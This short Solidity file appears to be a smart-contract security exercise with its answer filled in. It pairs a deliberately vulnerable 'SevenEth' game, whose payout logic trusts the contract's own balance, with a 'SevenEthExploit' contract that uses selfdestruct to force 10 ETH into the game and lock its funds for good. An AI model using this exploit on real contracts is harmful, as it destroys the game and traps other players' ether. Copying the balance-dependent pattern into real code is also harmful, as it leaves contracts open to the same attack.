// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Disable the game so that no one can win 7 ETH. 
// 10 ETH will be sent to pwn.
// By calling selfdestruct we can force 10 ETH into the target contract
// As a result, the balance will be over 7 eth and the require statement 
// always get triggered and the ETH is locked in the contract.

contract SevenEth {
    function play() external payable {
        require(msg.value == 1 ether, "not 1 ether");

        uint bal = address(this).balance;
        require(bal <= 7 ether, "game over");

        if (bal == 7 ether) {
            payable(msg.sender).transfer(7 ether);
        }
    }
}

contract SevenEthExploit {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function pwn() external payable {
        // write your code here
        selfdestruct(target);
    }
}
